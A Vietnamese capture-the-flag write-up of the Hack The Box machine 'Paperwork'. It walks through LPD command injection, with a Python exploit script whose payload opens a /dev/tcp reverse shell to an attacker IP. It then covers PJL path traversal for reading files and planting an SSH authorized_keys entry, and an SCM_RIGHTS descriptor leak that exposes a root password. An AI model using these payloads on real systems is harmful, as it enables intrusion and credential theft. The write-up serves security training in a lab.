---
title: "Paperwork Writeup - Hack The Box"
date: 2026-07-12 10:30:00 +0700
categories: [Hack The Box, Seasonal Machines]
tags:
  [
    hackthebox,
    paperwork,
    lpd,
    rfc1179,
    command-injection,
    jetdirect,
    pjl,
    path-traversal,
    arbitrary-file-read,
    arbitrary-file-write,
    scm-rights,
    linux,
  ]
---

> Machine: Paperwork  
> Difficulty: Easy  
> OS: Linux  
> Tags: LPD, RFC1179, Command Injection, JetDirect, PJL, Path Traversal, Arbitrary File Read/Write, Unix Socket, SCM_RIGHTS  
> Disclaimer: Bài viết được thực hiện trong môi trường HackTheBox được cấp quyền.

![Paperwork intake portal](/assets/img/20260712-paperwork-htb-writeup/intake-portal.png)

## Tổng quan

Paperwork là một machine Linux có attack path khá thú vị vì web ban đầu gần như chỉ đóng vai trò đưa hint. Lỗ hổng thật nằm ở các service nội bộ mô phỏng hệ thống in ấn: đầu tiên là LPD theo RFC1179, sau đó là JetDirect/PJL chạy bằng user khác, và cuối cùng là một root daemon truyền file descriptor qua Unix socket.

Attack chain của mình:

```text
Web Intake Portal
-> Tải internal processor source
-> Phân tích LPD server.py
-> Command injection trong dòng J của control file
-> Reverse shell user lp
-> Enum systemd, phát hiện jetdirect.service chạy bằng archivist
-> Dùng PJL trên 127.0.0.1:9100
-> Path traversal trong FSUPLOAD để đọc user.txt
-> FSDOWNLOAD để ghi authorized_keys
-> SSH vào archivist
-> Kết nối /run/paperwork/mgmt.sock
-> Trigger paperwork-daemon bằng log JetDirect
-> Nhận log_fd và admin_fd qua SCM_RIGHTS
-> Đọc ADMIN_PASSWORD
-> Dùng admin/root password để hoàn tất machine
```

Điểm mình thích ở box này là mỗi bước đều có một hint hợp lý. Web không cho khai thác trực tiếp, nhưng nó nói đúng giao thức, đúng queue, đúng internal processor. Từ đó mình phải chuyển mindset từ HTTP sang raw TCP protocol.

## 1. Recon ban đầu

Trên web, mình thấy một trang **Intake Portal** thuộc Department of Records & Archives. Trang này không có form upload hay login gì đáng khai thác ngay, nhưng phần cấu hình hệ thống lại rất quan trọng:

```text
Protocol: RFC 1179
Target Queue: archive_intake
Internal Processor: paperwork-archive-v1.02
```

![Intake Portal tiết lộ RFC1179 và queue archive_intake](/assets/img/20260712-paperwork-htb-writeup/intake-portal.png)

Chi tiết `RFC 1179` làm mình nghĩ tới LPD protocol. Ngoài ra link internal processor cho phép tải source backend, nên mình ưu tiên đọc source thay vì fuzz web.

## 2. Phân tích LPD server.py

Source đáng chú ý là `/opt/LPDServer/server.py`. Dịch vụ này nhận kết nối TCP, đọc byte lệnh đầu tiên, và nếu command là `2` thì xử lý print job.

Đoạn quan trọng nhất nằm ở phần đọc control file:

```python
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

`job_name` được lấy từ dòng bắt đầu bằng `J` trong LPD control file, sau đó đưa thẳng vào shell. Vì chuỗi đang nằm trong single quote, payload phù hợp là đóng quote, chèn command, rồi comment phần còn lại:

```text
x'; COMMAND; #
```

Nếu ghép vào command shell, nó sẽ thành dạng:

```bash
echo 'Archive: x'; COMMAND; #' >> /tmp/archive.log
```

Đây là command injection khá trực diện, nhưng cần gửi đúng format LPD chứ không thể bắn từ browser.

## 3. Initial Access qua LPD

Đầu tiên mình gửi receive-job command tới queue `archive_intake`:

```text
\x02archive_intake\n
```

Sau đó gửi control file command:

```text
\x02<size> cfA001attacker\n
```

Trong control file, payload nằm ở dòng `J`:

```text
Hattacker
Pattacker
Jx'; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'; #
```

Script exploit rút gọn:

```python
import socket
import sys

target = sys.argv[1]
port = 1515
queue = "archive_intake"

attacker_ip = "<ATTACKER_IP>"
attacker_port = 4444

payload = f"x'; bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'; #"

control = (
    "Hattacker\n"
    "Pattacker\n"
    f"J{payload}\n"
).encode()

s = socket.create_connection((target, port), timeout=5)
s.sendall(b"\x02" + queue.encode() + b"\n")

cmd = f"\x02{len(control)} cfA001attacker\n".encode()
s.sendall(cmd)
print("ACK1:", s.recv(1))

s.sendall(control + b"\x00")
print("ACK2:", s.recv(1))
s.close()
```

Khi chạy exploit, server trả ACK hợp lệ:

![LPD exploit nhận ACK từ server](/assets/img/20260712-paperwork-htb-writeup/lpd-exploit-ack.png)

Listener nhận shell:

```text
uid=7(lp) gid=7(lp) groups=7(lp)
pwd=/opt/LPDServer
```

![Reverse shell user lp và enum /etc/passwd](/assets/img/20260712-paperwork-htb-writeup/lp-shell-passwd.png)

## 4. Enumeration sau Foothold

Sau khi có shell `lp`, mình enum cơ bản:

```bash
id
pwd
hostname
uname -a
env
cat /etc/passwd
```

User đáng chú ý:

```text
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

Nhưng `lp` không vào được home của `archivist`:

```text
bash: cd: /home/archivist: Permission denied
```

Mình tiếp tục check service systemd và phát hiện một service thứ hai rất đáng chú ý:

```ini
[Service]
User=archivist
WorkingDirectory=/home/archivist/printer/
ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```

Điểm quan trọng ở đây là service `jetdirect` chạy bằng user `archivist` và listen trên port `9100`. Vì shell không có `nc`, mình dùng Python socket để nói chuyện với service nội bộ.

## 5. JetDirect/PJL trên port 9100

Probe đầu tiên:

```bash
python3 -c 'import socket; s=socket.create_connection(("127.0.0.1",9100),3); s.sendall(b"@PJL INFO ID\r\n"); s.settimeout(2); print(s.recv(4096).decode("latin1","replace"))'
```

Response:

```text
HP LASERJET 4ML
```

Như vậy service mô phỏng JetDirect/PJL. Mình thử các lệnh file system như `FSDIRLIST`, `FSUPLOAD`, `FSQUERY`.

## 6. Path Traversal trong jetdirect.py

Từ source `jetdirect.py`, phần translate path có logic như sau:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```

Vấn đề là code normalize path nhưng không kiểm tra path cuối cùng còn nằm trong root hay không. Không có check kiểu:

```python
target.startswith(self._root)
```

Vì vậy mình có thể dùng `../` để thoát khỏi `/home/archivist/printer/`.

Liệt kê home của `archivist`:

```bash
python3 -c 'import socket; p=b"\x1b%-12345X@PJL FSDIRLIST NAME=\"../\" ENTRY=1 COUNT=50\r\n\x1b%-12345X\r\n"; s=socket.create_connection(("127.0.0.1",9100),3); s.sendall(p); s.settimeout(2); print(s.recv(8192).decode("latin1","replace"))'
```

Sau đó đọc `user.txt`:

```bash
python3 -c 'import socket; p=b"\x1b%-12345X@PJL FSUPLOAD NAME=\"../user.txt\" OFFSET=0 SIZE=500\r\n\x1b%-12345X\r\n"; s=socket.create_connection(("127.0.0.1",9100),3); s.sendall(p); s.settimeout(2); print(s.recv(8192).decode("latin1","replace"))'
```

![Dùng PJL path traversal để đọc user.txt](/assets/img/20260712-paperwork-htb-writeup/jetdirect-user-read.png)

Như vậy mình đã đọc được user flag bằng quyền `archivist`, nhưng lúc này vẫn chưa có shell `archivist`.

## 7. Arbitrary File Write và SSH archivist

Trong `jetdirect.py`, chức năng ghi file dùng `open(..., "wb")`:

```python
def write(self, path, data):
    with open(target, "wb") as f:
        f.write(data)
```

Lệnh PJL tương ứng là `FSDOWNLOAD`. Ban đầu mình thử format:

```text
@PJL FSDOWNLOAD FORMAT:BINARY SIZE=91 NAME="../.ssh/authorized_keys"
```

Nhưng file `authorized_keys` chỉ bị tạo/truncate về size 0:

![authorized_keys bị tạo nhưng size vẫn bằng 0 khi dùng sai cú pháp FSDOWNLOAD](/assets/img/20260712-paperwork-htb-writeup/authorized-keys-empty.png)

Sau khi đọc lại cách parser xử lý, mình đổi sang cú pháp đặt `NAME` trước `SIZE` và bỏ `FORMAT:BINARY`:

```python
import socket
import time

pub = "ssh-ed25519 <PUBLIC_KEY> kali@kali\n"
data = pub.encode()

cmd = f'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE={len(data)}\r\n'.encode()

s = socket.create_connection(("127.0.0.1", 9100), 3)
s.sendall(b"\x1b%-12345X" + cmd)
time.sleep(0.2)
s.sendall(data)
time.sleep(0.2)
s.sendall(b"\x1b%-12345X\r\n")
s.close()
```

Sau đó đọc lại `authorized_keys`, mình thấy size đã đúng và public key đã được ghi. Từ Kali, SSH vào `archivist`:

```bash
chmod 600 archivist_key
ssh -i archivist_key archivist@10.129.11.48
```

Đến đây mình đã chuyển từ arbitrary read/write sang interactive shell của user `archivist`.

## 8. Root Daemon và Unix Socket

Sau khi có shell `archivist`, mình quay lại hướng privilege escalation. Service đáng chú ý là `paperwork-daemon` chạy bằng root:

```text
ExecStart=/usr/bin/python3 /usr/bin/paperwork-daemon
User=root
```

Trong source `/usr/bin/paperwork-daemon`, daemon mở file secret bằng quyền root:

```python
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
```

Nó cũng theo dõi log JetDirect:

```python
LOG_PATH = "/home/archivist/printer/logs/commands.log"
```

Nếu log chứa các pattern liên quan file operation:

```text
FSQUERY
FSUPLOAD
FSDOWNLOAD
```

thì daemon gọi `trigger_lockdown()`. Trong `trigger_lockdown()`, nó gửi cả `log_fd` và `admin_fd` qua Unix socket bằng `SCM_RIGHTS`:

```python
evidence_bundle = array.array("i", [log_fd, admin_fd])

conn.sendmsg(
    [msg],
    [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)]
)
```

Unix socket nằm ở:

```text
/run/paperwork/mgmt.sock
```

Quyền socket:

```text
srw-rw---- root archivist
```

Khi còn là `lp`, mình không connect được:

```text
PermissionError: [Errno 13] Permission denied
```

Điều này xác nhận mình phải có shell `archivist` trước khi nhận file descriptor.

## 9. Nhận admin_fd qua SCM_RIGHTS

Trên shell `archivist`, mình tạo script nhận file descriptor:

```python
import socket
import array
import os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(16))

print(msg.decode("latin1", "replace"))

for level, typ, data in ancdata:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])

for i, fd in enumerate(fds):
    print(f"--- FD {i}: {fd} ---")
    try:
        os.lseek(fd, 0, os.SEEK_SET)
    except OSError:
        pass
    print(os.read(fd, 8192).decode("latin1", "replace"))
```

Chạy receiver ở background:

`ash
python3 /tmp/rec.py > /tmp/out.txt 2>&1 &
`

![SCM_RIGHTS fd receiver script](/assets/img/20260712-paperwork-htb-writeup/recvfd-script.png)

Sau đó trigger JetDirect bằng một lệnh file operation:

```bash
python3 - <<'PY'
import socket
p=b'\x1b%-12345X@PJL FSQUERY NAME="../user.txt"\r\n\x1b%-12345X\r\n'
s=socket.create_connection(("127.0.0.1",9100),3)
s.sendall(p)
s.close()
PY
```

Đọc output:

```bash
cat /tmp/out.txt
```

Kết quả có hai fd:

```text
ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
--- FD 0: 4 ---
<commands.log>

--- FD 1: 5 ---
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Ở đây `FD 0` là log JetDirect, còn `FD 1` là file `/etc/paperwork/admin_pins.conf` đã được root daemon mở sẵn. Đây là đoạn hay nhất của box: mình không cần quyền đọc trực tiếp file secret, vì daemon đã mở file đó rồi chuyển descriptor qua socket cho group `archivist`.

Trước đó, khi thử đọc `/etc/paperwork/admin_pins.conf` trực tiếp bằng `FSUPLOAD`, connection bị reset vì `archivist` không có quyền đọc file:

![Đọc trực tiếp admin_pins.conf bị reset vì thiếu quyền](/assets/img/20260712-paperwork-htb-writeup/admin-pins-denied.png)

## 10. Root

Sau khi có secret:

```text
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

mình thử dùng nó cho tài khoản quản trị/root. Với box này, password đó là mảnh ghép cuối để đi từ `archivist` lên quyền cao hơn.

```bash
su -
```

Password:

```text
ApparelMortuaryCedar22
```

Sau khi có root shell, mình kiểm tra lại quyền và đọc flag:

Password `ApparelMortuaryCedar22` dung duoc cho root, nen minh lay duoc shell root.

`ash
id
cat /root/root.txt
`

![Root shell and root flag](/assets/img/20260712-paperwork-htb-writeup/root-shell.png)

## 11. Vì sao SCM_RIGHTS nguy hiểm trong case này?

`SCM_RIGHTS` cho phép một process gửi file descriptor qua Unix domain socket. Điều này không chỉ gửi đường dẫn file, mà gửi luôn handle đã được mở.

Trong case này, root daemon mở:

```text
/etc/paperwork/admin_pins.conf
```

bằng quyền root. Sau đó nó gửi `admin_fd` qua socket cho client thuộc group `archivist`. Khi client nhận được fd, client có thể đọc nội dung file thông qua fd đó, dù bản thân user `archivist` không có quyền mở path `/etc/paperwork/admin_pins.conf` trực tiếp.

Nói ngắn gọn: permission check đã xảy ra ở thời điểm root daemon gọi `os.open()`, không phải ở thời điểm client đọc fd được truyền sang.

## 12. Lessons Learned

Qua machine này, mình rút ra một số điểm khá hay:

- Web đôi khi chỉ là bảng chỉ dẫn. Nếu trang web nhắc tới protocol nội bộ như RFC1179, nên chuyển sang kiểm tra raw TCP protocol thay vì chỉ fuzz HTTP.
- Với LPD, control file chứa nhiều metadata quan trọng. Dòng `J` nhìn như job name bình thường nhưng lại trở thành input đi vào shell.
- `shell=True` cộng với string interpolation từ user-controlled data gần như luôn là red flag.
- Khi payload nằm trong single quote, pattern `x'; COMMAND; #` là hướng thoát quote cơ bản cần thử.
- Sau foothold, systemd service là nơi rất đáng enum. Ở đây `jetdirect.service` tiết lộ luôn user pivot, working directory, script và log path.
- Normalize path bằng `os.path.normpath()` không đủ để chống traversal. Sau normalize vẫn phải kiểm tra path cuối cùng có nằm trong root cho phép hay không.
- Arbitrary file read có thể cho user flag, nhưng arbitrary file write mới là thứ giúp biến quyền đọc thành shell ổn định.
- Khi một file bị tạo size 0, nên nghi ngờ parser hoặc thứ tự tham số, không chỉ nghi ngờ permission.
- Unix socket permission theo group có thể là pivot point quan trọng sau khi leo ngang.
- Truyền fd bằng `SCM_RIGHTS` rất mạnh, nhưng nếu gửi nhầm fd nhạy cảm cho user thấp quyền thì gần như biến thành file disclosure.
- Một daemon root không nên mở secret rồi gửi fd đó qua socket cho client không thật sự cần quyền đọc secret.

## Kết luận

Paperwork là một box khá gọn nhưng nhiều lớp. Initial foothold đến từ LPD command injection trong `server.py`, user flag đến từ JetDirect/PJL path traversal dưới quyền `archivist`, còn privilege escalation dựa trên việc root daemon gửi file descriptor chứa admin secret qua Unix socket.

Attack path cuối cùng:

```text
LPD command injection
-> lp shell
-> JetDirect PJL path traversal
-> read user.txt
-> FSDOWNLOAD authorized_keys
-> SSH archivist
-> SCM_RIGHTS fd leak
-> ADMIN_PASSWORD
-> root
```

Điểm đáng nhớ nhất với mình là bước `SCM_RIGHTS`: nó không phải kiểu đọc file qua path nữa, mà là nhận luôn một fd đã được root mở. Đây là một bug rất hay để nhớ khi audit các daemon nội bộ dùng Unix socket.
